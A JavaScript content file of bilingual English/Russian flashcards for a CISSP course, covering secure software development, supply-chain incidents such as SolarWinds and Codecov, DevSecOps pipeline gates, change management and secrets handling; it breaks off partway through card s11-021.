'use strict';
// Learning path, stage 11: software that defends itself. Security in the SDLC, methodologies, DevSecOps and the pipeline,
// change management for code, the development ecosystem and build integrity, application security testing, SCA and SBOM,
// secure coding and classic weaknesses, APIs, databases, acquired and open-source software, maturity models.
CISSP.stage(11, { cards: [
  { id: 's11-001', kind: 'story', k: ['d8-c4', 'd1-c13'], lvl: 1,
    title: { en: `SolarWinds 2020: the update was the attack`, ru: `SolarWinds 2020: атакой было обновление` },
    body: {
      en: `<p>SolarWinds Orion is software that watches networks, so it runs with wide access inside thousands of organisations.</p><p>Attackers got into SolarWinds' own network and planted a small tool on the <b>build server</b>. Each time Orion was compiled, it slipped a backdoor into the code, then put the original file back. The source code looked clean; the product didn't.</p><p>Between March and June 2020, about 18,000 customers installed the poisoned update, <b>signed with SolarWinds' real certificate</b>. The attackers picked around a hundred of them, including US government agencies, for the next step. FireEye found it in December 2020, while investigating a break-in of its own.</p>`,
      ru: `<p>SolarWinds Orion — программа для наблюдения за сетями, поэтому в тысячах организаций она работает с широким доступом.</p><p>Злоумышленники проникли в сеть самой SolarWinds и подложили небольшой инструмент на <b>сборочный сервер</b>. При каждой компиляции Orion он вставлял в код бэкдор, а потом возвращал исходный файл на место. Исходный код выглядел чистым, продукт — нет.</p><p>С марта по июнь 2020 года около 18 000 клиентов установили отравленное обновление, <b>подписанное настоящим сертификатом SolarWinds</b>. Примерно сотню из них, включая госагентства США, злоумышленники выбрали для следующего шага. FireEye обнаружила атаку в декабре 2020 года, расследуя взлом у себя.</p>`,
    },
    take: { en: `The way software is built is part of the product, and part of the attack surface.`, ru: `То, как собирают программу, — часть продукта и часть поверхности атаки.` } },

  { id: 's11-002', kind: 'idea', k: ['d8-c1', 'd3-c13'], lvl: 1,
    title: { en: `Shift left: fix it while it's cheap`, ru: `Сдвиг влево: исправляйте, пока дёшево` },
    body: {
      en: `<p>A security flaw can be caught at any step: in the requirements, the design, the code, testing, or after release. The later it's caught, the more it costs. A missing requirement is one sentence to add. The same gap found in production means rework, retesting, an emergency release, and maybe an incident.</p><p>So security moves "left", to the start of the <b>software development life cycle (SDLC)</b>: security requirements written next to the functional ones, threat modeling during design, checks while the code is written. It's the same idea as "built in, not bolted on" for whole systems, applied to code.</p>`,
      ru: `<p>Уязвимость можно поймать на любом шаге: в требованиях, в дизайне, в коде, при тестировании или после выпуска. Чем позже, тем дороже. Недостающее требование — одно предложение. Тот же пробел в продуктиве — переделка, повторное тестирование, срочный релиз и, возможно, инцидент.</p><p>Поэтому безопасность сдвигают «влево», в начало <b>жизненного цикла разработки ПО (SDLC)</b>: требования безопасности пишут рядом с функциональными, угрозы моделируют на этапе дизайна, проверки идут, пока пишется код. Та же идея «встроено, а не прикручено», что и для систем целиком, только для кода.</p>`,
    },
    take: { en: `The earlier a flaw is found, the cheaper it is to fix: start security at requirements.`, ru: `Чем раньше найден дефект, тем дешевле его исправить: начинайте с требований.` } },

  { id: 's11-003', kind: 'picture', k: ['d8-c1', 'd3-c13'], lvl: 1,
    title: { en: `The SDLC, with security at every step`, ru: `SDLC с безопасностью на каждом шаге` },
    body: {
      en: `<p>Every phase of the life cycle has its own security work. None of it replaces the others: a perfect code scan can't fix a design that trusts the wrong thing, and a perfect design can be ruined by one unchecked input. The last phase is easy to forget: when software is retired, its data has to be kept, moved or destroyed on purpose.</p>`,
      ru: `<p>У каждой фазы жизненного цикла своя работа по безопасности, и ни одна не заменяет другие: идеальное сканирование кода не исправит дизайн, который доверяет не тому, а идеальный дизайн можно испортить одним непроверенным вводом. Последнюю фазу легко забыть: когда программу выводят из эксплуатации, её данные нужно сознательно сохранить, перенести или уничтожить.</p>`,
    },
    dg: { title: { en: `Security activities across the SDLC`, ru: `Активности безопасности по фазам SDLC` }, h: 300,
      nodes: [
        ['req', 110, 70, { en: 'Requirements', ru: 'Требования' }, { en: 'security & privacy needs', ru: 'безопасность и приватность' }, '📋', 'key'],
        ['des', 380, 70, { en: 'Design', ru: 'Дизайн' }, { en: 'threat model, review', ru: 'модель угроз, ревью' }, '📐', 'key'],
        ['dev', 650, 70, { en: 'Development', ru: 'Разработка' }, { en: 'secure coding, SAST, SCA', ru: 'безопасный код, SAST, SCA' }, '⌨️', 'ok'],
        ['test', 650, 230, { en: 'Testing', ru: 'Тестирование' }, { en: 'DAST, fuzzing, pentest', ru: 'DAST, фаззинг, пентест' }, '🧪', 'ok'],
        ['ops', 380, 230, { en: 'Deploy & operate', ru: 'Внедрение и эксплуатация' }, { en: 'patch, monitor, change', ru: 'патчи, мониторинг, изменения' }, '⚙️', 'ok'],
        ['disp', 110, 230, { en: 'Disposal', ru: 'Вывод' }, { en: 'retain, migrate, wipe', ru: 'хранить, перенести, стереть' }, '🗑️', 'dim'],
      ],
      edges: [['req', 'des', '', 'ok'], ['des', 'dev', '', 'ok'], ['dev', 'test', '', 'ok'], ['test', 'ops', '', 'ok'], ['ops', 'disp', '', 'dash']],
      note: { en: `Shift left: the cost of a fix grows with every arrow.`, ru: `Сдвиг влево: цена исправления растёт с каждой стрелкой.` } },
    take: { en: `Each phase has its own security work; none replaces the others.`, ru: `У каждой фазы своя работа по безопасности; ни одна не заменяет другие.` } },

  { id: 's11-004', kind: 'vs', k: ['d8-c1', 'd6-c4'], lvl: 2,
    title: { en: `Use case vs misuse case`, ru: `Сценарий использования и сценарий злоупотребления` },
    body: {
      en: `<ul><li><b>Functional requirement / use case</b>: what the system must do. "A customer can reset their password by email."</li><li><b>Security requirement</b>: a property it must keep. "A reset link works once and expires after 15 minutes."</li><li><b>Misuse (abuse) case</b>: what an attacker will try. "Someone requests resets for 10,000 accounts" or "someone changes the email address in the request."</li></ul><p>Developers naturally write the first kind. Security adds the other two, and the misuse cases later become test cases: if nobody wrote them down, nobody tests them.</p>`,
      ru: `<ul><li><b>Функциональное требование / сценарий использования</b>: что система должна делать. «Клиент может сбросить пароль по почте».</li><li><b>Требование безопасности</b>: свойство, которое она должна сохранять. «Ссылка сброса срабатывает один раз и истекает через 15 минут».</li><li><b>Сценарий злоупотребления</b>: что попробует злоумышленник. «Кто-то запрашивает сброс для 10 000 учёток» или «кто-то подменяет адрес почты в запросе».</li></ul><p>Разработчики естественно пишут первое. Безопасность добавляет остальное, и сценарии злоупотребления потом становятся тестами: если их никто не записал, их никто и не проверит.</p>`,
    },
    take: { en: `Write down what an attacker will try; it becomes the test plan.`, ru: `Запишите, что попробует злоумышленник: это станет планом тестов.` } },

  { id: 's11-005', kind: 'back', back: 's07-003', k: ['d1-c12', 'd8-c1'], lvl: 2,
    title: { en: `Threat modeling again: on the team's whiteboard`, ru: `Снова моделирование угроз: на доске команды` },
    body: {
      en: `<p>In stage 7 threat modeling was attacking a design on paper: draw the data flow, mark the trust boundaries, walk through STRIDE.</p><p>In a software team it happens at the design step, before the first line of code, and again whenever a change crosses a trust boundary: a new API, a new third-party service, a new type of user. It doesn't need a security expert in the room every time. A one-hour session with the four questions (what are we building, what can go wrong, what will we do about it, did we do a good job) catches most design flaws while they're still drawings.</p>`,
      ru: `<p>На этапе 7 моделирование угроз было атакой на дизайн на бумаге: нарисовать потоки данных, отметить границы доверия, пройтись по STRIDE.</p><p>В команде разработки это происходит на шаге дизайна, до первой строки кода, и снова при каждом изменении, пересекающем границу доверия: новый API, новый внешний сервис, новый тип пользователя. Эксперт по безопасности не нужен каждый раз. Часовая встреча с четырьмя вопросами (что мы строим, что может пойти не так, что мы с этим сделаем, хорошо ли получилось) ловит большинство ошибок дизайна, пока они ещё рисунки.</p>`,
    },
    take: { en: `Threat model at design time, and again when a change crosses a trust boundary.`, ru: `Моделируйте угрозы при дизайне и снова, когда изменение пересекает границу доверия.` } },

  { id: 's11-006', kind: 'think', k: ['d8-c1', 'd6-c3'], lvl: 2,
    title: { en: `A pentest a week before launch`, ru: `Пентест за неделю до запуска` },
    body: {
      en: `<p>A product team has built a new customer portal over nine months. Security hasn't been involved. Launch is in ten days, announced to customers. The project manager asks you to "run a quick pentest so we can say security signed off."</p><p>What do you say?</p>`,
      ru: `<p>Команда девять месяцев делала новый клиентский портал. Безопасность не привлекали. Запуск через десять дней, клиентам уже объявлен. Руководитель проекта просит «быстро провести пентест, чтобы сказать, что безопасность одобрила».</p><p>Что вы ответите?</p>`,
    },
    reveal: {
      en: `<p>Do the test: it's the best you can do now, and it may find serious problems. But be clear about what it is. A week of testing can find bugs; it can't find a design that was wrong from the start, and it isn't a sign-off.</p><p>Report findings by risk to the <b>business owner</b>, who decides whether to launch with them. That's their call, not yours or the project manager's. Then fix the process: security requirements and a design review at the start of the next project. A late pentest is a symptom of security being left to the end.</p>`,
      ru: `<p>Проведите тест: сейчас это лучшее, что можно сделать, и он может найти серьёзные проблемы. Но честно скажите, что это такое. За неделю можно найти ошибки, но не дизайн, неверный с самого начала, и это не одобрение.</p><p>Отчитайтесь о находках по уровню риска перед <b>владельцем бизнеса</b>: он решает, запускаться ли с ними. Это его решение, не ваше и не руководителя проекта. А затем исправьте процесс: требования безопасности и ревью дизайна в начале следующего проекта. Поздний пентест — симптом того, что безопасность оставили на конец.</p>`,
    },
    take: { en: `A late test finds bugs, not design flaws; the owner accepts the risk, then fix the process.`, ru: `Поздний тест находит ошибки, а не изъяны дизайна; риск принимает владелец, затем чините процесс.` } },

  { id: 's11-007', kind: 'idea', k: ['d8-c1'], lvl: 2,
    title: { en: `The team that builds it together`, ru: `Команда, которая строит вместе` },
    body: {
      en: `<p>A security team that only appears at the end, to say no, gets avoided. Two habits fix that.</p><p>An <b>integrated product team (IPT)</b> puts everyone with a stake in the room from the start: developers, testers, operations, security, the business owner, sometimes legal and privacy. Decisions about risk are made together, while they're still cheap to change.</p><p><b>Security champions</b> are developers in each team with extra security training. They don't replace the security team; they're the first person to ask, and they notice problems in code reviews because they understand both sides.</p>`,
      ru: `<p>Команду безопасности, которая появляется только в конце, чтобы сказать «нет», начинают обходить. Это лечат две привычки.</p><p><b>Интегрированная продуктовая команда (IPT)</b> с самого начала собирает всех заинтересованных: разработчиков, тестировщиков, эксплуатацию, безопасность, владельца бизнеса, иногда юристов и специалистов по приватности. Решения о рисках принимают вместе, пока их ещё дёшево менять.</p><p><b>Чемпионы безопасности</b> — разработчики в каждой команде с дополнительным обучением. Они не заменяют команду безопасности: к ним идут с первым вопросом, и они замечают проблемы на ревью кода, потому что понимают обе стороны.</p>`,
    },
    take: { en: `Bring every stakeholder in early (IPT) and grow security champions inside teams.`, ru: `Привлекайте всех заинтересованных рано (IPT) и растите чемпионов безопасности в командах.` } },

  { id: 's11-008', kind: 'vs', k: ['d8-c2'], lvl: 2,
    title: { en: `Waterfall vs V-model vs spiral`, ru: `Водопад, V-модель и спираль` },
    body: {
      en: `<ul><li><b>Waterfall</b>: phases in strict order, each finished and signed off before the next. Clear documents and gates; but a flaw found in testing means going back up a long way.</li><li><b>V-model</b>: waterfall where each build phase has a matching test phase planned at the same time (requirements ↔ acceptance test, design ↔ integration test).</li><li><b>Spiral</b>: repeated loops, each starting with a <b>risk analysis</b> and ending with a prototype. Suits large, risky projects.</li></ul><p>Rule: waterfall is about order, V-model about testing each phase, spiral about risk in every loop.</p>`,
      ru: `<ul><li><b>Водопад</b>: фазы строго по порядку, каждая завершается и утверждается до следующей. Ясные документы и контрольные точки, но дефект, найденный на тестировании, требует долгого возврата назад.</li><li><b>V-модель</b>: водопад, где у каждой фазы создания есть парная фаза проверки, спланированная одновременно (требования ↔ приёмочный тест, дизайн ↔ интеграционный).</li><li><b>Спираль</b>: повторяющиеся витки, каждый начинается с <b>анализа рисков</b> и заканчивается прототипом. Для больших рискованных проектов.</li></ul><p>Правило: водопад — про порядок, V-модель — про проверку каждой фазы, спираль — про риск на каждом витке.</p>`,
    },
    take: { en: `Waterfall = strict order; V-model = a test for each phase; spiral = risk analysis each loop.`, ru: `Водопад — строгий порядок; V-модель — тест на каждую фазу; спираль — анализ риска на каждом витке.` } },

  { id: 's11-009', kind: 'idea', k: ['d8-c2'], lvl: 2,
    title: { en: `Agile: security in two-week pieces`, ru: `Agile: безопасность кусками по две недели` },
    body: {
      en: `<p><b>Agile</b> methods (Scrum is the best known) deliver working software in short iterations, often two-week <b>sprints</b>, and value working software and customer feedback over big upfront documents.</p><p>Security doesn't get its own phase in agile, so it has to live inside every sprint:</p><ul><li>security stories in the backlog ("as an attacker, I…" becomes a misuse case);</li><li>security in the <b>definition of done</b>: a story isn't finished until its code passed review and automated checks;</li><li>a quick threat-model update when a sprint changes the design.</li></ul><p>Done this way, agile can be safer than waterfall: problems surface every two weeks, not at the end.</p>`,
      ru: `<p>Методы <b>Agile</b> (самый известный — Scrum) выпускают работающее ПО короткими итерациями, часто двухнедельными <b>спринтами</b>, и ценят работающий продукт и отзывы клиента выше больших предварительных документов.</p><p>Отдельной фазы для безопасности в agile нет, поэтому она должна жить внутри каждого спринта:</p><ul><li>истории безопасности в бэклоге («как злоумышленник, я…» становится сценарием злоупотребления);</li><li>безопасность в <b>критериях готовности</b>: история не закончена, пока код не прошёл ревью и автоматические проверки;</li><li>быстрое обновление модели угроз, когда спринт меняет дизайн.</li></ul><p>При таком подходе agile может быть безопаснее водопада: проблемы всплывают каждые две недели, а не в конце.</p>`,
    },
    take: { en: `In agile, security lives in the backlog and the definition of done, every sprint.`, ru: `В agile безопасность живёт в бэклоге и критериях готовности, в каждом спринте.` } },

  { id: 's11-010', kind: 'vs', k: ['d8-c2'], lvl: 2,
    title: { en: `Prototyping, RAD, JAD and cleanroom`, ru: `Прототипирование, RAD, JAD и cleanroom` },
    body: {
      en: `<ul><li><b>Prototyping</b>: build a rough version to learn what users need. Risk: the prototype quietly becomes the product, without the security it never had.</li><li><b>RAD</b> (rapid application development): fast delivery with prototypes and user feedback, little formal planning.</li><li><b>JAD</b> (joint application development): users and developers design together in workshops.</li><li><b>Cleanroom</b>: prevent defects instead of testing them out, with formal methods and statistical testing. Suits critical systems.</li><li><b>Incremental</b>: deliver the system in parts, each a small waterfall.</li></ul><p>For the exam: know which one puts users in the room (JAD), which is about speed (RAD), and which aims at zero defects (cleanroom).</p>`,
      ru: `<ul><li><b>Прототипирование</b>: строят черновую версию, чтобы понять потребности. Риск: прототип тихо становится продуктом, без безопасности, которой у него не было.</li><li><b>RAD</b> (быстрая разработка приложений): быстрые поставки с прототипами и отзывами, мало формального планирования.</li><li><b>JAD</b> (совместная разработка): пользователи и разработчики проектируют вместе на семинарах.</li><li><b>Cleanroom</b>: не допускать дефектов вместо их поиска, с формальными методами и статистическим тестированием. Для критичных систем.</li><li><b>Инкрементная</b>: система выпускается частями, каждая — маленький водопад.</li></ul><p>Для экзамена: какая сажает пользователей за стол (JAD), какая про скорость (RAD), какая стремится к нулю дефектов (cleanroom).</p>`,
    },
    take: { en: `JAD = users in workshops, RAD = speed, cleanroom = prevent defects; beware prototypes that ship.`, ru: `JAD — пользователи на семинарах, RAD — скорость, cleanroom — предотвращение дефектов; опасайтесь прототипов в продуктиве.` } },

  { id: 's11-011', kind: 'idea', k: ['d8-c2', 'd8-c4'], lvl: 2,
    title: { en: `DevOps, then DevSecOps`, ru: `DevOps, а затем DevSecOps` },
    body: {
      en: `<p><b>DevOps</b> joins development and operations: the same team builds, ships and runs the software, and releases are automated through a <b>CI/CD pipeline</b> (continuous integration and delivery). Some companies release many times a day.</p><p>At that speed, a security review by hand before each release is impossible. <b>DevSecOps</b> makes security part of the same automation: code scanning, dependency checks and secret detection run on every change; infrastructure is defined as code and checked too; and a failed check stops the pipeline, the same way a failed unit test does.</p><p>Security becomes everybody's job, with the security team writing the rules the pipeline enforces.</p>`,
      ru: `<p><b>DevOps</b> объединяет разработку и эксплуатацию: одна команда создаёт, выпускает и сопровождает ПО, а релизы автоматизированы через <b>конвейер CI/CD</b> (непрерывная интеграция и поставка). Некоторые компании выпускают обновления много раз в день.</p><p>При такой скорости ручная проверка безопасности перед каждым релизом невозможна. <b>DevSecOps</b> встраивает безопасность в ту же автоматизацию: сканирование кода, проверка зависимостей и поиск секретов запускаются на каждое изменение; инфраструктура описана кодом и тоже проверяется; проваленная проверка останавливает конвейер, как упавший модульный тест.</p><p>Безопасность становится делом каждого, а команда безопасности пишет правила, которые конвейер соблюдает.</p>`,
    },
    take: { en: `DevSecOps: security checks run automatically in the pipeline and can stop a release.`, ru: `DevSecOps: проверки безопасности идут автоматически в конвейере и могут остановить релиз.` } },

  { id: 's11-012', kind: 'back', back: 's02-014', k: ['d7-c3', 'd8-c4'], lvl: 2,
    title: { en: `Separation of duties again: in the pipeline settings`, ru: `Снова разделение обязанностей: в настройках конвейера` },
    body: {
      en: `<p>In stage 2 separation of duties showed up in a software pipeline: the developer can't approve their own deploy.</p><p>Now you can see where that rule actually lives. It's not a policy document; it's settings:</p><ul><li><b>protected branches</b>: nobody, including admins, pushes straight to the main branch;</li><li><b>required review</b>: a pull request needs approval from someone other than its author;</li><li>only the pipeline, not people, holds the credentials to production;</li><li>changing these settings is itself logged and restricted.</li></ul><p>A rule that one admin can switch off on a Friday evening isn't separation of duties yet.</p>`,
      ru: `<p>На этапе 2 разделение обязанностей появилось в конвейере ПО: разработчик не может одобрить собственный деплой.</p><p>Теперь видно, где это правило живёт на самом деле. Не в документе, а в настройках:</p><ul><li><b>защищённые ветки</b>: никто, включая админов, не пушит прямо в главную ветку;</li><li><b>обязательное ревью</b>: pull request одобряет не его автор;</li><li>учётные данные к продуктиву есть только у конвейера, не у людей;</li><li>изменение этих настроек само журналируется и ограничено.</li></ul><p>Правило, которое один админ может отключить в пятницу вечером, — ещё не разделение обязанностей.</p>`,
    },
    take: { en: `SoD in code: protected branches, required reviews, only the pipeline touches production.`, ru: `Разделение обязанностей в коде: защищённые ветки, обязательное ревью, в продуктив ходит только конвейер.` } },

  { id: 's11-013', kind: 'picture', k: ['d8-c4', 'd6-c4'], lvl: 2,
    title: { en: `A pipeline with security gates`, ru: `Конвейер с воротами безопасности` },
    body: {
      en: `<p>Each change travels the same road. Fast checks run first, where they give the developer feedback in minutes; slower ones run later. The build signs what it produces, and production only accepts signed artifacts from this pipeline. Any red gate stops the change, not just raises a ticket.</p>`,
      ru: `<p>Каждое изменение проходит одну дорогу. Быстрые проверки идут первыми, давая разработчику ответ за минуты; медленные — позже. Сборка подписывает то, что выпускает, и продуктив принимает только подписанные артефакты из этого конвейера. Красные ворота останавливают изменение, а не просто заводят заявку.</p>`,
    },
    dg: { title: { en: `CI/CD pipeline with security gates`, ru: `Конвейер CI/CD с воротами безопасности` }, h: 300,
      nodes: [
        ['commit', 90, 70, { en: 'Commit', ru: 'Коммит' }, { en: 'secret scan', ru: 'поиск секретов' }, '⌨️', 'dim'],
        ['review', 280, 70, { en: 'Review', ru: 'Ревью' }, { en: 'second person', ru: 'второй человек' }, '👀', 'key'],
        ['build', 470, 70, { en: 'Build', ru: 'Сборка' }, { en: 'SAST, SCA', ru: 'SAST, SCA' }, '🏗️', 'ok'],
        ['sign', 660, 70, { en: 'Sign', ru: 'Подпись' }, { en: 'artifact + SBOM', ru: 'артефакт + SBOM' }, '✍️', 'key'],
        ['test', 470, 230, { en: 'Test env', ru: 'Тестовая среда' }, { en: 'DAST, fuzzing', ru: 'DAST, фаззинг' }, '🧪', 'ok'],
        ['prod', 160, 230, { en: 'Production', ru: 'Продуктив' }, { en: 'signed only', ru: 'только подписанное' }, '🚀', 'ok'],
      ],
      edges: [['commit', 'review', '', 'ok'], ['review', 'build', '', 'ok'], ['build', 'sign', '', 'ok'], ['sign', 'test', '', 'ok'], ['test', 'prod', { en: 'all gates green', ru: 'все ворота зелёные' }, 'ok']],
      note: { en: `Cheap checks first; production trusts the signature, not the person.`, ru: `Дешёвые проверки первыми; продуктив доверяет подписи, а не человеку.` } },
    take: { en: `Automated gates on every change; production accepts only signed output of the pipeline.`, ru: `Автоматические ворота на каждое изменение; продуктив принимает только подписанное конвейером.` } },

  { id: 's11-014', kind: 'story', k: ['d7-c6', 'd8-c1'], lvl: 2,
    title: { en: `Knight Capital 2012: 45 minutes, $460 million`, ru: `Knight Capital 2012: 45 минут, 460 миллионов долларов` },
    body: {
      en: `<p>On 1 August 2012, Knight Capital, one of the largest US stock traders, rolled out new trading code to eight servers. A technician copied it to only seven.</p><p>The new code reused an old flag. On the eighth server, that flag woke up "Power Peg", trading logic unused since 2003 and never removed. When the market opened, that server started buying high and selling low, millions of orders, and nobody knew how to stop it. There was no written procedure for that.</p><p>In 45 minutes Knight lost about $460 million. Within a week it needed rescue money, and it was later taken over.</p>`,
      ru: `<p>1 августа 2012 года Knight Capital, один из крупнейших биржевых трейдеров США, выкатил новый торговый код на восемь серверов. Техник скопировал его только на семь.</p><p>Новый код повторно использовал старый флаг. На восьмом сервере этот флаг разбудил «Power Peg» — торговую логику, не используемую с 2003 года и так и не удалённую. С открытием рынка сервер начал покупать дорого и продавать дёшево, миллионы заявок, и никто не знал, как это остановить. Письменной процедуры на такой случай не было.</p><p>За 45 минут Knight потерял около 460 миллионов долларов. Через неделю ему понадобились спасительные деньги, а позже его поглотили.</p>`,
    },
    take: { en: `Untested, manual, partial deployment plus dead code: change management failed in minutes.`, ru: `Ручной частичный деплой без проверки плюс мёртвый код: управление изменениями провалилось за минуты.` } },

  { id: 's11-015', kind: 'idea', k: ['d7-c6', 'd8-c4'], lvl: 2,
    title: { en: `Change management, for code`, ru: `Управление изменениями — для кода` },
    body: {
      en: `<p>Knight Capital had smart engineers. What it lacked was a controlled way to change production. For software, that means:</p><ul><li><b>version control</b> for everything, so you know exactly what's running;</li><li>the same automated deployment to every server, with a check that all of them match;</li><li>a <b>rollback plan</b> written before the release, not during the crisis;</li><li>removing dead code and old flags, not just leaving them switched off;</li><li>approvals that match the risk: routine changes pre-approved, risky ones reviewed by a change board.</li></ul><p>Change management feels slow until you count what an uncontrolled change costs.</p>`,
      ru: `<p>В Knight Capital работали умные инженеры. Не было управляемого способа менять продуктив. Для ПО это значит:</p><ul><li><b>система контроля версий</b> для всего, чтобы точно знать, что работает;</li><li>одинаковый автоматический деплой на все серверы и проверка, что они совпадают;</li><li><b>план отката</b>, написанный до релиза, а не во время кризиса;</li><li>удаление мёртвого кода и старых флагов, а не просто их отключение;</li><li>согласования по уровню риска: рутинные изменения одобрены заранее, рискованные — через совет по изменениям.</li></ul><p>Управление изменениями кажется медленным, пока не посчитаешь цену неуправляемого изменения.</p>`,
    },
    take: { en: `Version everything, deploy identically, plan rollback first, delete dead code.`, ru: `Всё под версионированием, одинаковый деплой, откат заранее, мёртвый код удалить.` } },

  { id: 's11-016', kind: 'think', k: ['d7-c6', 'd7-c3', 'd8-c4'], lvl: 2,
    title: { en: `The fix at 2 a.m.`, ru: `Исправление в 2 часа ночи` },
    body: {
      en: `<p>At 2 a.m. the payment service is failing for every customer. The on-call developer has found a one-line fix. The normal process needs a second reviewer and a change ticket; nobody else is awake. The developer has production access "for emergencies".</p><p>What should happen?</p>`,
      ru: `<p>В 2 часа ночи платёжный сервис отказывает всем клиентам. Дежурный разработчик нашёл исправление в одну строку. Обычный процесс требует второго рецензента и заявки на изменение; никто больше не спит. У разработчика есть доступ к продуктиву «на случай аварии».</p><p>Что должно произойти?</p>`,
    },
    reveal: {
      en: `<p>Use the <b>emergency change</b> procedure, which a good change process has in advance. Typically: the developer may apply the fix to restore service, it's done through the pipeline where possible, the emergency access is logged, and the change gets its review and approval <b>after the fact</b>, the next morning.</p><p>What's wrong is either extreme: leaving customers down for hours because the reviewer is asleep, or quietly fixing it with no record. An emergency path that's written, logged and reviewed later keeps both availability and accountability.</p>`,
      ru: `<p>Применить процедуру <b>экстренного изменения</b>, которая в хорошем процессе есть заранее. Обычно так: разработчик вправе применить исправление, чтобы вернуть сервис, по возможности через конвейер, экстренный доступ журналируется, а ревью и утверждение изменение получает <b>задним числом</b>, утром.</p><p>Неправильны обе крайности: оставить клиентов без сервиса на часы, потому что рецензент спит, или тихо поправить без записи. Экстренный путь, который описан, журналируется и проверяется потом, сохраняет и доступность, и подотчётность.</p>`,
    },
    take: { en: `Emergency changes need a pre-agreed path: fix now, log it, review it next day.`, ru: `Для экстренных изменений нужен заранее согласованный путь: исправить сейчас, записать, проверить утром.` } },

  { id: 's11-017', kind: 'vs', k: ['d8-c4', 'd2-c6'], lvl: 1,
    title: { en: `Development, test, staging, production`, ru: `Разработка, тест, предпрод, продуктив` },
    body: {
      en: `<ul><li><b>Development</b>: where code is written and broken. Wide access for developers, no real data.</li><li><b>Test / QA</b>: where testers check it. Often run by a separate team.</li><li><b>Staging</b>: a copy of production's setup, for the final check.</li><li><b>Production</b>: real customers, real data. Developers usually have no standing access.</li></ul><p>Two rules follow. Keep them <b>separate</b>, so a mistake in development can't touch production. And don't copy real personal data into test: use synthetic or masked data. Test environments are less protected, and breaches through them are common.</p>`,
      ru: `<ul><li><b>Разработка</b>: здесь код пишут и ломают. Широкий доступ разработчиков, без реальных данных.</li><li><b>Тест / QA</b>: здесь его проверяют тестировщики, часто отдельная команда.</li><li><b>Предпрод (staging)</b>: копия настроек продуктива для финальной проверки.</li><li><b>Продуктив</b>: реальные клиенты, реальные данные. Постоянного доступа у разработчиков обычно нет.</li></ul><p>Из этого два правила. Держите среды <b>раздельно</b>, чтобы ошибка в разработке не задела продуктив. И не копируйте реальные персональные данные в тест: используйте синтетические или маскированные. Тестовые среды защищены хуже, и утечки через них часты.</p>`,
    },
    take: { en: `Separate environments; no real personal data in test, mask or synthesize it.`, ru: `Среды раздельно; никаких реальных персональных данных в тесте — маскируйте или синтезируйте.` } },

  { id: 's11-018', kind: 'idea', k: ['d8-c4', 'd1-c13'], lvl: 2,
    title: { en: `Every tool is part of the supply chain`, ru: `Каждый инструмент — часть цепочки поставок` },
    body: {
      en: `<p>A program is written in a language, edited in an <b>IDE</b> with plug-ins, stored in a <b>code repository</b>, built by a <b>build server</b> that downloads <b>libraries</b> from public registries, and run on a <b>runtime</b>. Each of these is software someone else wrote, and each can change what ships.</p><p>So the development ecosystem gets the same controls as production: accounts with MFA, least privilege, logs, patching, and an inventory of the tools and plug-ins in use. The build server deserves special care: anyone who controls it controls every customer who installs the result, as SolarWinds showed.</p>`,
      ru: `<p>Программу пишут на языке, правят в <b>IDE</b> с плагинами, хранят в <b>репозитории кода</b>, собирают на <b>сборочном сервере</b>, который скачивает <b>библиотеки</b> из публичных реестров, и запускают в <b>среде выполнения</b>. Всё это — ПО, написанное кем-то другим, и всё может изменить то, что уйдёт клиентам.</p><p>Поэтому к среде разработки применяют те же меры, что к продуктиву: учётки с MFA, минимальные права, журналы, патчи и опись используемых инструментов и плагинов. Сборочный сервер требует особой заботы: кто управляет им, управляет каждым клиентом, установившим результат, как показал SolarWinds.</p>`,
    },
    take: { en: `IDE, repository, build server, libraries, runtime: protect them like production.`, ru: `IDE, репозиторий, сборочный сервер, библиотеки, среда выполнения: защищайте как продуктив.` } },

  { id: 's11-019', kind: 'story', k: ['d8-c4', 'd1-c13', 'd3-c8'], lvl: 2,
    title: { en: `Codecov 2021: the script that phoned home`, ru: `Codecov 2021: скрипт, который звонил домой` },
    body: {
      en: `<p>Codecov measures how much of a program its tests cover. Thousands of companies ran its small upload script inside their build pipelines, downloading it fresh each time.</p><p>In January 2021 attackers used a credential leaked from Codecov's own image-building process to change that script. For about two months, every pipeline that ran it quietly sent its <b>environment variables</b> to the attackers. In CI, those often hold cloud keys, tokens and passwords.</p><p>A customer caught it in April by comparing the script's hash with the one published on GitHub: they didn't match. Hundreds of companies then had to rotate every secret their pipelines had seen.</p>`,
      ru: `<p>Codecov измеряет, какую часть программы покрывают тесты. Тысячи компаний запускали его небольшой скрипт загрузки в своих конвейерах сборки, каждый раз скачивая его заново.</p><p>В январе 2021 года злоумышленники воспользовались учётными данными, утёкшими из процесса сборки образов самой Codecov, и изменили этот скрипт. Около двух месяцев каждый запускавший его конвейер тихо отправлял им свои <b>переменные окружения</b>. В CI там часто лежат облачные ключи, токены и пароли.</p><p>В апреле клиент заметил подмену, сравнив хеш скрипта с опубликованным на GitHub: они не совпали. Сотням компаний пришлось сменить все секреты, которые видели их конвейеры.</p>`,
    },
    take: { en: `Pin and verify what your pipeline downloads; secrets in CI are a prize.`, ru: `Фиксируйте и проверяйте то, что скачивает конвейер; секреты в CI — желанная добыча.` } },

  { id: 's11-020', kind: 'back', back: 's07-045', k: ['d3-c9', 'd8-c4'], lvl: 2,
    title: { en: `The key in the repository again: secrets management`, ru: `Снова ключ в репозитории: управление секретами` },
    body: {
      en: `<p>In stage 7 a cloud key was pushed to a public repository and abused within minutes. Codecov shows the same secrets leaking from the pipeline instead.</p><p>The fix is the same in both places: secrets don't live in code or in plain environment variables. They live in a <b>secrets manager</b> (a vault), which hands them out at run time to the identity that needs them, logs each use, and rotates them. Better still, use short-lived credentials that the cloud issues to the workload itself, so there's no long-lived key to steal.</p><p>And scan every commit for secrets, because someone will paste one eventually.</p>`,
      ru: `<p>На этапе 7 облачный ключ попал в публичный репозиторий, и им злоупотребили за минуты. Codecov показывает, как те же секреты утекают из конвейера.</p><p>Решение в обоих случаях одно: секреты не живут в коде или в открытых переменных окружения. Они живут в <b>менеджере секретов</b> (хранилище), который выдаёт их во время работы той идентичности, которой они нужны, журналирует каждое использование и меняет их. Ещё лучше — короткоживущие учётные данные, которые облако выдаёт самой нагрузке: тогда нет долгоживущего ключа, который можно украсть.</p><p>И сканируйте каждый коммит на секреты: кто-нибудь однажды вставит.</p>`,
    },
    take: { en: `Secrets go in a vault, issued at run time and rotated; prefer short-lived credentials.`, ru: `Секреты — в хранилище, выдаются при работе и меняются; лучше короткоживущие учётные данные.` } },

  { id: 's11-021', kind: 'idea', k: ['d8-c4', 'd1-c13'], lvl: 3,
    title: { en: `Proving where a build came from`, ru: `Как доказать, откуда взялась сборка` },
    body: {
